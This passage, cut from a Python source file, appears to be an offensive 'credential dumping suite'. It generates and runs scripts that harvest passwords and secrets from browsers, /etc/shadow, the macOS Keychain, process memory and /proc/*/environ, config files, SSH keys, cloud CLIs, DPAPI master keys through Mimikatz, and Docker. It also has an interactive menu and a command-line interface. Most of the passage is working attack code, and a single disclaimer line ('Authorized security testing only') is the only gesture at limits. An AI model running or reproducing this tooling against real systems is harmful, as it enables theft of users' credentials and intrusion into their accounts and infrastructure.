        chrome_out = os.path.join(browser_dir, "chrome_creds.txt")
        chrome_script = BrowserCredentialDumper.chrome_extract(chrome_out)
        
        chrome_path = os.path.join(browser_dir, "chrome_extract.py")
        with open(chrome_path, 'w') as f:
            f.write(chrome_script)
        print(f"[+] Chrome extractor: {chrome_path}")
        
        # Firefox
        firefox_out = os.path.join(browser_dir, "firefox_creds.txt")
        firefox_script = BrowserCredentialDumper.firefox_extract(firefox_out)
        
        firefox_path = os.path.join(browser_dir, "firefox_extract.py")
        with open(firefox_path, 'w') as f:
            f.write(firefox_script)
        print(f"[+] Firefox extractor: {firefox_path}")
        
        print("\n[*] Browser extraction scripts ready. Run:")
        print(f"    python3 {chrome_path}")
        print(f"    python3 {firefox_path}")
        
        # Note about decryption
        print("\n[*] NOTE: Passwords are encrypted with platform-specific keys.")
        print("    For Chrome Chrome 80+: AES-GCM with DPAPI protected key")
        print("    For Firefox: 3DES with master password")
        print("    Use tools like 'chrome_decrypt' or 'firefox_decrypt' for full decryption")
    
    def dump_shadow(self):
        """Technique 5: Linux shadow."""
        dumper = LinuxCredDumper()
        shadow_dir = os.path.join(self.session_dir, "linux_shadow")
        
        cmds = dumper.dump_shadow(shadow_dir)
        print("[*] Shadow dump commands (requires root):")
        for cmd in cmds:
            if cmd:
                print(f"    {cmd}")
        
        # Try parsing if files exist
        shadow_file = "/etc/shadow"
        if os.access(shadow_file, os.R_OK):
            print("\n[*] Reading shadow file directly (running as root)...")
            users = dumper.parse_shadow(shadow_file)
            
            with open(os.path.join(shadow_dir, "parsed_users.txt"), 'w') as f:
                for user in users:
                    f.write(f"User: {user['username']}\n")
                    f.write(f"Hash Type: {user['hash_type']}\n")
                    f.write(f"Hash: {user['hash']}\n")
                    f.write("-" * 40 + "\n")
            
            print(f"[+] Parsed {len(users)} users:")
            for user in users:
                print(f"    {user['username']:20s} [{user['hash_type']}]")
    
    def dump_keychain(self):
        """Technique 6: macOS Keychain."""
        dumper = MacKeychainDumper()
        keychain_dir = os.path.join(self.session_dir, "keychain")
        os.makedirs(keychain_dir, exist_ok=True)
        
        print("[*] Keychain dump commands:")
        cmds = dumper.security_list(os.path.join(keychain_dir, "keychain_dump.txt"))
        for cmd in cmds:
            print(f"    {cmd}")
        
        safari_script = dumper.safari_password_extract()
        safari_path = os.path.join(keychain_dir, "safari_extract.sh")
        with open(safari_path, 'w') as f:
            f.write(safari_script)
        print(f"[+] Safari extractor: {safari_path}")
        
        chainbreaker_cmds = dumper.chainbreaker_automation(keychain_dir)
        print("\n[*] Offline keychain parsing:")
        for cmd in chainbreaker_cmds:
            print(f"    {cmd}")
    
    def dump_memory(self):
        """Technique 7: Memory scraping."""
        scraper = MemoryScraper()
        mem_dir = os.path.join(self.session_dir, "memory_scans")
        os.makedirs(mem_dir, exist_ok=True)
        
        script = scraper.linux_proc_mem_scan(
            output_file=os.path.join(mem_dir, "memory_creds.txt")
        )
        
        script_path = os.path.join(mem_dir, "memory_scanner.py")
        with open(script_path, 'w') as f:
            f.write(script)
        
        print(f"[+] Memory scanner: {script_path}")
        print("    Run with: python3 {script_path}")
        print("    NOTE: Requires root access to read /proc/<pid>/mem")
    
    def dump_configs(self):
        """Technique 8: Config file scanning."""
        scanner = ConfigFileScanner()
        config_dir = os.path.join(self.session_dir, "config_scans")
        os.makedirs(config_dir, exist_ok=True)
        
        script = scanner.scanner(
            output_file=os.path.join(config_dir, "config_creds.txt")
        )
        
        script_path = os.path.join(config_dir, "config_scanner.py")
        with open(script_path, 'w') as f:
            f.write(script)
        
        print(f"[+] Config file scanner: {script_path}")
        print("    Run with: python3 {script_path}")
        print("    Scans for: passwords, secrets, API keys, tokens, SSH keys in config files")
    
    def dump_ssh(self):
        """Technique 9: SSH key discovery."""
        dumper = SSHKeyDiscovery()
        ssh_dir = os.path.join(self.session_dir, "ssh_keys")
        
        cmds = dumper.discover_keys(ssh_dir)
        print("[*] SSH key discovery commands:")
        for cmd in cmds:
            print(f"    {cmd}")
    
    def dump_cloud(self):
        """Technique 10: Cloud credentials."""
        scanner = CloudCredScanner()
        cloud_dir = os.path.join(self.session_dir, "cloud_creds")
        os.makedirs(cloud_dir, exist_ok=True)
        
        script = scanner.scan_cloud_creds(
            output_file=os.path.join(cloud_dir, "cloud_creds.txt")
        )
        
        script_path = os.path.join(cloud_dir, "cloud_scanner.py")
        with open(script_path, 'w') as f:
            f.write(script)
        
        print(f"[+] Cloud credential scanner: {script_path}")
        print("    Run with: python3 {script_path}")
        print("    Scans for: AWS, GCP, Azure credentials")
    
    def dump_dpapi(self):
        """Technique 11: DPAPI master keys."""
        dumper = DPAPIDumper()
        dpapi_dir = os.path.join(self.session_dir, "dpapi")
        
        cmds = dumper.dump_master_keys(dpapi_dir)
        print("[*] DPAPI master key extraction commands:")
        for cmd in cmds:
            print(f"    {cmd}")
        
        print(f"\n[*] Mimikatz command:")
        print(f"    {dumper.dpapi_mimikatz()}")
    
    def dump_docker(self):
        """Technique 12: Docker credentials."""
        dumper = DockerCredScanner()
        docker_dir = os.path.join(self.session_dir, "docker")
        os.makedirs(docker_dir, exist_ok=True)
        
        cmds = dumper.scan_docker(
            output_file=os.path.join(docker_dir, "docker_creds.txt")
        )
        
        cmds_path = os.path.join(docker_dir, "docker_scan.sh")
        with open(cmds_path, 'w') as f:
            f.write("#!/bin/bash\n\n")
            for cmd in cmds:
                f.write(f"# {cmd.split('//')[0] if '//' in cmd else ''}\n")
                f.write(f"{cmd} 2>/dev/null || true\n\n")
        
        os.chmod(cmds_path, 0o755)
        print(f"[+] Docker scanner: {cmds_path}")
        print("    Run with: bash {cmds_path}")
        print("    NOTE: Requires docker socket access")
    
    def dump_environ(self):
        """Scan process environments for credentials."""
        env_dir = os.path.join(self.session_dir, "environ")
        os.makedirs(env_dir, exist_ok=True)
        
        print("[*] Scanning /proc/*/environ for credentials...")
        
        scan_script = f'''
import os
import re
from pathlib import Path

output = r"{env_dir}"
results = []

sensitive_keys = [
    "PASSWORD", "PASSWD", "SECRET", "TOKEN", "API_KEY",
    "API_SECRET", "ACCESS_KEY", "SECRET_KEY", "CREDENTIAL",
    "AUTH_TOKEN", "BEARER", "SESSION_KEY", "PRIVATE_KEY",
    "MYSQL_PWD", "PGPASSWORD", "REDIS_PASSWORD",
]

for proc_dir in Path('/proc').iterdir():
    if not proc_dir.name.isdigit():
        continue
    
    environ_path = proc_dir / 'environ'
    cmdline_path = proc_dir / 'cmdline'
    
    if not environ_path.exists():
        continue
    
    try:
        data = environ_path.read_bytes()
        cmdline = cmdline_path.read_bytes() if cmdline_path.exists() else b''
        
        # Split by null bytes
        env_vars = data.split(b'\\x00')
        
        for var in env_vars:
            try:
                decoded = var.decode('utf-8', errors='ignore')
                if '=' in decoded:
                    key, value = decoded.split('=', 1)
                    if any(s in key.upper() for s in {sensitive_keys}):
                        results.append({{
                            'pid': proc_dir.name,
                            'key': key,
                            'value': value[:100],
                            'cmdline': cmdline.decode('utf-8', errors='ignore')[:100]
                        }})
            except:
                pass
    except PermissionError:
        pass
    except Exception as e:
        pass

with open(os.path.join(output, 'environ_creds.txt'), 'w') as f:
    for r in results:
        f.write(f"PID: {{r['pid']}} | {{r['key']}}={{r['value']}}\\n")
        f.write(f"  Cmdline: {{r['cmdline']}}\\n\\n")

print(f"[+] Found {{len(results)}} credentials in process environments")
for r in results[:10]:
    print(f"    PID {{r['pid']}}: {{r['key']}}={{r['value'][:40]}}...")
'''
        script_path = os.path.join(env_dir, "environ_scanner.py")
        with open(script_path, 'w') as f:
            f.write(scan_script)
        
        print(f"[+] Environment scanner: {script_path}")
        print("    Run with: python3 {script_path}")
    
    def generate_report(self):
        """Generate a summary report of all findings."""
        report_path = os.path.join(self.session_dir, "SUMMARY_REPORT.md")
        
        with open(report_path, 'w') as f:
            f.write(f"# Credential Dumping Report\n\n")
            f.write(f"**Session:** {self.timestamp}\n")
            f.write(f"**System:** {self.system}\n")
            f.write(f"**Hostname:** {os.uname().nodename if hasattr(os, 'uname') else 'N/A'}\n")
            f.write(f"**User:** {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}\n\n")
            
            f.write("## Techniques Executed\n\n")
            f.write("| Technique | Status | Output Location |\n")
            f.write("|-----------|--------|-----------------|\n")
            
            for root, dirs, files in os.walk(self.session_dir):
                for file in files:
                    rel_path = os.path.relpath(os.path.join(root, file), self.session_dir)
                    size = os.path.getsize(os.path.join(root, file))
                    f.write(f"| {file} | Generated | `{rel_path}` ({size:,} bytes) |\n")
            
            f.write("\n## Extracted Artifacts\n\n")
            f.write(f"All data saved to: `{self.session_dir}`\n\n")
            
            f.write("## Next Steps\n\n")
            f.write("1. **LSASS dump**: Use mimikatz or pypykatz to parse\n")
            f.write("2. **SAM hives**: Use samdump2 or pypykatz to extract hashes\n")
            f.write("3. **Browser passwords**: Use dedicated decryptors\n")
            f.write("4. **Config files**: Review manually for hardcoded credentials\n")
            f.write("5. **Cloud credentials**: Use with respective CLIs (aws, gcloud, az)\n")
            f.write("6. **SSH keys**: Try each key for authentication\n\n")
            
            f.write("---\n")
            f.write("*Generated by Unpin Credential Dumping Suite*\n")
            f.write("*Authorized security testing only*\n")
        
        print(f"\n{'='*60}")
        print(f"[✓] CREDENTIAL DUMPING COMPLETE")
        print(f"[✓] Report: {report_path}")
        print(f"[✓] Session directory: {self.session_dir}")
        print(f"{'='*60}")
        
        # List all files
        print(f"\n[*] Files generated:")
        for root, dirs, files in os.walk(self.session_dir):
            for file in files:
                fpath = os.path.join(root, file)
                size = os.path.getsize(fpath)
                print(f"    {fpath} ({size:,} bytes)")
    
    def interactive_menu(self):
        """Interactive technique selection."""
        while True:
            print(f"\n{'='*50}")
            print("  UNPIN - CREDENTIAL DUMPING MENU")
            print(f"{'='*50}")
            
            if self.system.startswith('win'):
                print("  1. LSASS Memory Dump")
                print("  2. SAM Registry Hives")
                print("  3. Credential Manager")
                print("  4. Browser Credentials")
                print("  5. DPAPI Master Keys")
                print("  6. Cloud Credentials")
                print("  7. Config File Scanner")
                print("  8. SSH Key Discovery")
                print("  9. Docker Credentials")
                print("  10. RUN ALL")
                print("  0. Exit")
                
                choice = input("\nSelect technique: ").strip()
                
                if choice == '1': self.dump_lsass()
                elif choice == '2': self.dump_sam()
                elif choice == '3': self.dump_credman()
                elif choice == '4': self.dump_browsers()
                elif choice == '5': self.dump_dpapi()
                elif choice == '6': self.dump_cloud()
                elif choice == '7': self.dump_configs()
                elif choice == '8': self.dump_ssh()
                elif choice == '9': self.dump_docker()
                elif choice == '10': self.run_all()
                elif choice == '0': break
                
            elif self.system.startswith('linux'):
                print("  1. Shadow File Dump")
                print("  2. Browser Credentials")
                print("  3. Memory Scraping")
                print("  4. Config File Scanner")
                print("  5. SSH Key Discovery")
                print("  6. Cloud Credentials")
                print("  7. Docker Credentials")
                print("  8. Process Environment Scan")
                print("  9. RUN ALL")
                print("  0. Exit")
                
                choice = input("\nSelect technique: ").strip()
                
                if choice == '1': self.dump_shadow()
                elif choice == '2': self.dump_browsers()
                elif choice == '3': self.dump_memory()
                elif choice == '4': self.dump_configs()
                elif choice == '5': self.dump_ssh()
                elif choice == '6': self.dump_cloud()
                elif choice == '7': self.dump_docker()
                elif choice == '8': self.dump_environ()
                elif choice == '9': self.run_all()
                elif choice == '0': break
            
            elif self.system.startswith('darwin'):
                print("  1. Keychain Dump")
                print("  2. Browser Credentials")
                print("  3. Memory Scraping")
                print("  4. Config File Scanner")
                print("  5. SSH Key Discovery")
                print("  6. Cloud Credentials")
                print("  7. Docker Credentials")
                print("  8. RUN ALL")
                print("  0. Exit")
                
                choice = input("\nSelect technique: ").strip()
                
                if choice == '1': self.dump_keychain()
                elif choice == '2': self.dump_browsers()
                elif choice == '3': self.dump_memory()
                elif choice == '4': self.dump_configs()
                elif choice == '5': self.dump_ssh()
                elif choice == '6': self.dump_cloud()
                elif choice == '7': self.dump_docker()
                elif choice == '8': self.run_all()
                elif choice == '0': break
            
            print("\n[*] Press Enter to continue...")
            input()


# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Unpin - Universal Credential Dumping Suite',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cred_dump.py                     # Interactive menu
  python3 cred_dump.py --all               # Run all applicable techniques
  python3 cred_dump.py --output ./creds    # Custom output directory
  python3 cred_dump.py --linux-shadow      # Only dump shadow file
        """
    )
    
    parser.add_argument('--all', action='store_true', help='Run all applicable techniques')
    parser.add_argument('--output', default='credential_dumps', help='Output directory')
    parser.add_argument('--interactive', action='store_true', help='Interactive menu mode')
    
    # Platform-specific shortcuts
    parser.add_argument('--lsass', action='store_true', help='Dump LSASS (Windows)')
    parser.add_argument('--sam', action='store_true', help='Dump SAM hives (Windows)')
    parser.add_argument('--shadow', action='store_true', help='Dump shadow file (Linux)')
    parser.add_argument('--keychain', action='store_true', help='Dump keychain (macOS)')
    parser.add_argument('--browsers', action='store_true', help='Dump browser credentials')
    parser.add_argument('--cloud', action='store_true', help='Scan for cloud credentials')
    parser.add_argument('--configs', action='store_true', help='Scan config files')
    parser.add_argument('--memory', action='store_true', help='Memory scraping')
    parser.add_argument('--ssh', action='store_true', help='Discover SSH keys')
    parser.add_argument('--docker', action='store_true', help='Scan Docker credentials')
    
    args = parser.parse_args()
    
    dumper = CredentialDumper(output_dir=args.output)
    
    if args.all:
        dumper.run_all()
    elif any([args.lsass, args.sam, args.shadow, args.keychain, 
              args.browsers, args.cloud, args.configs, 
              args.memory, args.ssh, args.docker]):
        # Run specific techniques
        if args.lsass and sys.platform.startswith('win'):
            dumper.dump_lsass()
        if args.sam and sys.platform.startswith('win'):
            dumper.dump_sam()
        if args.shadow and sys.platform.startswith('linux'):
            dumper.dump_shadow()
        if args.keychain and sys.platform.startswith('darwin'):
            dumper.dump_keychain()
        if args.browsers:
            dumper.dump_browsers()
        if args.cloud:
            dumper.dump_cloud()
        if args.configs:
            dumper.dump_configs()
        if args.memory:
            dumper.dump_memory()
        if args.ssh:
            dumper.dump_ssh()
        if args.docker:
            dumper.dump_docker()
    else:
        dumper.interactive_menu()
